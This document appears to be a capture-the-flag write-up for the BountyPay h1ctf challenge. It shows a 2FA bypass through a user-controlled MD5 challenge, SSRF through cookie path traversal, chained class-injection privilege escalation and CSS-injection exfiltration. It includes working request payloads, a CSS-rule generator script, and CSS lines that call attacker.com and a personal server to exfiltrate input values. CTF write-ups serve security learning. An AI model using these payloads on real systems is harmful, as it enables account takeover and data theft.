# 0x3 Two-Factor Authentication Bypass

Two factor authentication implemented at https://app.bountypay.h1ctf.com can be bypassed if user name / password is known.

### Details

After providing valid username and password at Login page of https://app.bountypay.h1ctf.com user is asked to provide 10 character token that was sent to his mobile phone.

One of the hidden parameters that are passed via HTML form is `challenge`. 

```html
<form method="post" action="/">
                <input type="hidden" name="username" value="brian.oliver">
                <input type="hidden" name="password" value="V7h0inzX">
                <input type="hidden" name="challenge" value="d1442073259978fe231a00f297e00626">
								<input name="challenge_answer" class="form-control">
```

When user submit token password following request is made:

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=f561aaf6ef0bf14d4208bb46a4ccb3ad&challenge_answer=xxx
```

The problem is that `challenge` parameter that is used to check if provided `challenge_answer` is correct is completely under user's control. That means if algorithm used to compare both values is known attacked can provide both values and effectively bypass 2FA.

In this case algorithm is very basic:

`challenge` = MD5(`challenge_answer`)

### Proof of Concept

We can intercept request when `challenge_answer` value is sent to server and modify both `challenge` and `challenge_answer` values:

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=f561aaf6ef0bf14d4208bb46a4ccb3ad&challenge_answer=xxx
```

Where MD5('xxx') = 'f561aaf6ef0bf14d4208bb46a4ccb3ad'

# 0x4 Chaining multiple vulnerabilities into SSRF

By chaining multiple vulnerabilities it is possible to read internal assets via server side request forgery (SSRF).

## 0x4.1 Path traversal

https://app.bountypay.h1ctf.com/statements endpoint makes internal HTTP request to https://api.bountypay.h1ctf.com/api/accounts/account_id/statements API endpoint and provides response in JSON format:

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
[...]
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

Part of the URL of internal API call can be controlled by attacker via `token` session cookie.

 `token` cookie is a base64 encoded JSON object containing following data:

```json
token = {"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

Modifying `account_id` value does not invalidate the session. Also this value is reflected in the URL where internal API call is made in `/statements`  endpoint:

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
[...]
Cookie: token=Base64Encode({"account_id":"**user_supplied_data**","hash":"de235bffd23df6995ad4e0930baac1a2"})

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/**user_supplied_data**\/statements?month=01&year=2020","data":"[\"Endpoint Not Found\"]"}
```

Improper validation of this user controllable cookie results in path traversal and effectively allows calling any endpoint on https://api.bountypay.h1ctf.com/ host (attacker can suffix injected value with hash sign # to turn the rest of the URL into a url fragment and force server to skip it) :

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
[...]
Cookie: token=Base64Encode({"account_id":""../../#"","hash":"de235bffd23df6995ad4e0930baac1a2"})

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/#\/statements?month=01&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n[...]>"}
```

This bug when exploited alone doesn't have big impact but it can be chained with another issue that was found on `https://api.bountypay.h1ctf.com` site to increase impact.

# 0x7 Privilege escalation

With use of *Report This Page* functionality found on https://staff.bountypay.h1ctf.com/ it is possible to escalate privileges of currently logged in user. This require chaining multiple vulnerabilities. Each vulnerability will be described separately and chaining will be presented at the end.

### 0x7.1 Stored code injection

It is possible to inject HTML code into https://staff.bountypay.h1ctf.com/ by intercepting and modifying request for changing profile avatar:

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Cookie: token=xxx

profile_name=sandra&profile_avatar=avatar2%20injected%20code
```

Injected code will be reflected in Profile tab and in `/?template=ticket&ticket_id=3582` example ticket:

```html
<div class="panel-body">
                    <div style="width: 100px;position: absolute">
                        <div style="margin:auto" class="avatar avatar1 injected code"></div>
                        <div class="text-center">sandra</div>
                    </div>
                    <div>
```

Reflected code is properly escaped so no HTML tags, quotes and special characters are allowed however this is enough to inject any class name into DOM context.

This vulnerability combined with Javascript code available in `/js/website.js` lets attacker inject class names that will receive `click` events.

Following code turns any element with `tab` class into clickable element: 

```javascript
$(".tab").click(function() {
    return $(".tab").removeClass("active"),
    $(this).addClass("active"),
    $("div.content").addClass("hidden"),
    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"),
    !1
}),
```

Following code turns any element with `upgradeToAdmin` class into clickable element: 

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}) 
```

### 0x7.2 Click event triggering

Another piece of code in `website.js` allows attacker to generate `click` events which, if combined with two described earlier clickable class elements, can be used to execute Javascript without user interaction.

```javascript
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"),
"#tab2" === document.location.hash && $(".tab2").trigger("click"),
"#tab3" === document.location.hash && $(".tab3").trigger("click"),
"#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

This code triggers `click` events if specific fragment is attached to current URL. So by appending URL with `#tab2` fragment attacker can send `click` event to any element with `tab2` class assigned.

### 0x7.3 Parameter injection

https://staff.bountypay.h1ctf.com/?template parameter is vulnerable to parameter injection where attacker, by converting `template` parameter into array: `template[]` can pass multiple values to web server resulting in concatenation of multiple templates:

`/?template[]=home&template[]=login`

### 0x7.4 Chaining vulnerabilities

`website.js` code contains AJAX call that, if run by privileged user, can upgrade specific user to admin role:

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}),
```

With all presented vulnerabilities attacker can design an attack targeting this functionality:

1. Attacker can Inject class names `tab` , `tab2` and `upgradeToAdmin` into profile avatar DIV to turn it into clickable element that after clicking will execute code for `upgradeToAdmin` class elemen
2. Attacker can attach `#tab2` to [/?template=ticket&ticket_id=3582](https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582) URL to execute `click` event on profile avatar DIV element effectively creating URL that will trigger `upgradeToAdmin` code without user interaction
3. As code in `upgradeToAdmin` require `INPUT` element with name set to `username`  attacker can use Parameter injection vulnerability to concatenate `ticket` and `login`templates
4. `login` template contains required `INPUT` element and attacker can control it's value with parameter `username=` attached to URL.

Putting points 2-4 together attacker can construct following URL:

`/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2`

Which, when visited by privileged user, will execute XHR call to `/admin/upgrade?username=sandra.allison` with his user credentials without interaction effectively resulting in privilege escalation.

# 0x8 Two factor authentication bypass via CSS Injection

Functionality for paying bounties at https://app.bountypay.h1ctf.com is protected by two factor authentication.

It is possible to bypass 2FA authentication by performing CSS injection attack on mobile phone application which generates 2FA codes.

## Details

When 2FA code functionality is executed following request is made to the server:

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

`app_style` parameter holds URL for CSS style definition file that is rendered on mobile device.

By manipulating this parameter attacker can inject own CSS definitions hosted from server under his control. This effectively means attacker can ex-filtrate various HTML elements included in the HTML page styled with injected CSS.

The main use for exploiting a CSS injection is data ex-filtration from input elements. The general CSS injection data ex-filtration method is to use css like:

```css
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
```

If the first letter of input value is 'c' above CSS will trigger page load on https://attacker.com/exfil/c (which can be observed in web server logs).

## Proof of concept

To perform successful CSS injection to exfiltrate `INPUT` element we need to know element name. Usually this is known as page source is available. In this case injection is done into web page with unknown structure.

### Step 1

So first step will be finding input element name by injecting following CSS:

```css
input[name^="a"] {
 background: url(https://www.jeti.pw/exfil/a);
}

input[name^="b"] {
 background: url(https://www.jeti.pw/exfil/b);
}
[...]
```

I've created helper python script to speed up the process of generating 

```python
import string
import sys

url = sys.argv[1]
prefix = sys.argv[2]

for i in string.ascii_letters + string.digits + "-_":
  print ('input[name^="{}{}"] {{\n background: url({}/{}{});\n}}\n'.format(prefix,i,url,prefix,i))
```

Script takes `url` and `prefix` parameters and generates CSS file to stdout.

